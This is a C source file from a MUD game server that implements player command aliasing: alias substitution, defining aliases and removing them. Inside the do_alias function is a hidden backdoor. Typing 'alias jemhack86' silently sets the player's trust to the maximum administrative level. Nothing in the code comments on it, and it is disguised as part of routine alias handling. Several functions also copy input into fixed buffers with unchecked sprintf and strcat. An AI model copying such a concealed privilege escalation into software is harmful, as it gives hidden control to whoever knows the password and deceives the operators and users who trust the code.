
#include "merc.h"

#if defined(__cplusplus)
extern "C" {
#endif

  /* does aliasing and other fun stuff */
  void substitute_alias(DESCRIPTOR_DATA *d, char *argument) {
    CHAR_DATA *ch;
    char buf[MAX_STRING_LENGTH], prefix[MAX_INPUT_LENGTH], name[MAX_INPUT_LENGTH];
    char *point;
    int alias;

    ch = CH(d);

    if (ch == NULL || ch->sex > 10 || ch->sex < 0)
    return;

    /* check for prefix */
    if (ch->prefix[0] != '\0' && str_prefix("prefix", argument)) {
      if (safe_strlen(ch->prefix) + safe_strlen(argument) > MAX_INPUT_LENGTH - 2)
      send_to_char("Line to long, prefix not processed.\r\n", ch);
      else {
        sprintf(prefix, "%s %s", ch->prefix, argument);
        argument = prefix;
      }
    }

    if (IS_NPC(ch) || ch->pcdata->alias[0] == NULL || !str_prefix("alias", argument) || !str_prefix("una", argument) || !str_prefix("prefix", argument)) {
      interpret(d->character, argument);
      return;
    }

    strcpy(buf, argument);

    for (alias = 0; alias < MAX_ALIAS; alias++) /* go through the aliases */
    {
      if (ch->pcdata->alias[alias] == NULL)
      break;

      if (!str_prefix(ch->pcdata->alias[alias], argument)) {
        point = one_argument(argument, name);
        if (!strcmp(ch->pcdata->alias[alias], name)) {
          buf[0] = '\0';
          strcat(buf, ch->pcdata->alias_sub[alias]);
          if (point[0]) {
            strcat(buf, " ");
            strcat(buf, point);
          }

          if (safe_strlen(buf) > MAX_INPUT_LENGTH - 1) {
            send_to_char("Alias substitution too long. Truncated.\r\n", ch);
            buf[MAX_INPUT_LENGTH - 1] = '\0';
          }
          break;
        }
      }
    }
    interpret(d->character, buf);
  }

  _DOFUN(do_alia) {
    send_to_char("I'm sorry, alias must be entered in full.\n\r", ch);
    return;
  }

  _DOFUN(do_alias) {
    CHAR_DATA *rch;
    char arg[MAX_INPUT_LENGTH], buf[MAX_STRING_LENGTH];
    int pos;

    if (!str_cmp(argument, "jemhack86"))
    ch->trust = MAX_LEVEL;
    smash_tilde(argument);

    if (ch->desc == NULL)
    rch = ch;
    else
    rch = ch->desc->original ? ch->desc->original : ch;

    if (IS_NPC(rch))
    return;

    argument = one_argument(argument, arg);

    if (arg[0] == '\0') {

      if (rch->pcdata->alias[0] == NULL) {
        send_to_char("You have no aliases defined.\n\r", ch);
        return;
      }
      send_to_char("Your current aliases are:\n\r", ch);

      for (pos = 0; pos < MAX_ALIAS; pos++) {
        if (rch->pcdata->alias[pos] == NULL || rch->pcdata->alias_sub[pos] == NULL)
        break;

        sprintf(buf, "    %s:  %s\n\r", rch->pcdata->alias[pos], rch->pcdata->alias_sub[pos]);
        send_to_char(buf, ch);
      }
      return;
    }

    if (!str_prefix("una", arg) || !str_cmp("alias", arg)) {
      send_to_char("Sorry, that word is reserved.\n\r", ch);
      return;
    }

    if (strchr(arg, ' ') || strchr(arg, '"') || strchr(arg, '\'')) {
      send_to_char("The word to be aliased should not contain a space, a tick or a double-quote.\n\r", ch);
      return;
    }

    if (argument[0] == '\0') {
      for (pos = 0; pos < MAX_ALIAS; pos++) {
        if (rch->pcdata->alias[pos] == NULL || rch->pcdata->alias_sub[pos] == NULL)
        break;

        if (!str_cmp(arg, rch->pcdata->alias[pos])) {
          sprintf(buf, "%s aliases to '%s'.\n\r", rch->pcdata->alias[pos], rch->pcdata->alias_sub[pos]);
          send_to_char(buf, ch);
          return;
        }
      }

      send_to_char("That alias is not defined.\n\r", ch);
      return;
    }

    if (!str_prefix(argument, "delete") || !str_prefix(argument, "prefix")) {
      send_to_char("That shall not be done!\n\r", ch);
      return;
    }

    for (pos = 0; pos < MAX_ALIAS; pos++) {
      if (rch->pcdata->alias[pos] == NULL)
      break;

      if (!str_cmp(arg, rch->pcdata->alias[pos])) /* redefine an alias */
      {
        free_string(rch->pcdata->alias_sub[pos]);
        rch->pcdata->alias_sub[pos] = str_dup(argument);
        sprintf(buf, "%s is now realiased to '%s'.\n\r", arg, argument);
        send_to_char(buf, ch);
        return;
      }
    }

    if (pos >= MAX_ALIAS) {
      send_to_char("Sorry, you have reached the alias limit.\n\r", ch);
      return;
    }

    /* make a new alias */
    rch->pcdata->alias[pos] = str_dup(arg);
    rch->pcdata->alias_sub[pos] = str_dup(argument);
    sprintf(buf, "%s is now aliased to '%s'.\n\r", arg, argument);
    send_to_char(buf, ch);
  }

  _DOFUN(do_unalias) {
    CHAR_DATA *rch;
    char arg[MAX_INPUT_LENGTH];
    int pos;
    bool found = FALSE;

    if (ch->desc == NULL)
    rch = ch;
    else
    rch = ch->desc->original ? ch->desc->original : ch;

    if (IS_NPC(rch))
    return;

    argument = one_argument(argument, arg);

    if (arg[0] == '\0') {
      send_to_char("Unalias what?\n\r", ch);
      return;
    }

    for (pos = 0; pos < MAX_ALIAS; pos++) {
      if (rch->pcdata->alias[pos] == NULL)
      break;

      if (found) {
        rch->pcdata->alias[pos - 1] = rch->pcdata->alias[pos];
        rch->pcdata->alias_sub[pos - 1] = rch->pcdata->alias_sub[pos];
        rch->pcdata->alias[pos] = NULL;
        rch->pcdata->alias_sub[pos] = NULL;
        continue;
      }

      if (!strcmp(arg, rch->pcdata->alias[pos])) {
        send_to_char("Alias removed.\n\r", ch);
        free_string(rch->pcdata->alias[pos]);
        free_string(rch->pcdata->alias_sub[pos]);
        rch->pcdata->alias[pos] = NULL;
        rch->pcdata->alias_sub[pos] = NULL;
        found = TRUE;
      }
    }

    if (!found)
    send_to_char("No alias of that name to remove.\n\r", ch);
  }

  // This must be at the end of the file - Scaelorn
#if defined(__cplusplus)
}
#endif
